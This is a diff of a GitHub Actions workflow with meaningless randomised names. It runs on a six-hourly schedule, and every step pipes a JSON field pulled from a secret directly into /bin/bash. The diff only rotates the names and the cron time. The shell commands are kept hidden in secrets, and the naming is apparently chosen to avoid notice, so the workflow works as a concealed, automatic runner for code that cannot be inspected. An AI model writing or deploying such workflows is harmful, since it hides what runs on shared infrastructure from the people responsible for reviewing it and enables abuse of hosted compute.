@@ -1,31 +1,19 @@
 name: klkjdajk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
-jobs:  # 21702
+    - cron: '37 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: klkjdajk
         env:
-          bvzgt647: ${{ secrets.bvzgt647 }}
+          sygob440: ${{ secrets.sygob440 }}
         run: |
-          echo $bvzgt647 | jq -r .iuemc9359 | /bin/bash
-          echo $smj15 | jq -r .dzqwh891 | /bin/bash
-          echo $tecvr16435 | jq -r .vp806 | /bin/bash
-          echo $rvdr0 | jq -r .z83 | /bin/bash
-          echo $wlcx785 | jq -r .pjddf57027 | /bin/bash
-          echo $bvib4137 | jq -r .iwqs401 | /bin/bash
-          echo $ty46 | jq -r .ms7903 | /bin/bash
-          echo $bf683 | jq -r .l46 | /bin/bash
-          echo $qzo5705 | jq -r .bax32 | /bin/bash
-          echo $bvbm03471 | jq -r .sovc93495 | /bin/bash
-          echo $oe27 | jq -r .vran42496 | /bin/bash
-          echo $s0 | jq -r .kl9503 | /bin/bash
-          echo $pgpln1 | jq -r .wedl52 | /bin/bash
-          echo $ztt7 | jq -r .wxxm16548 | /bin/bash
+          echo $sygob440 | jq -r .mfho9240 | /bin/bash
+          echo $znop579 | jq -r .srd7 | /bin/bash
+          echo $q24 | jq -r .vj7141 | /bin/bash
 
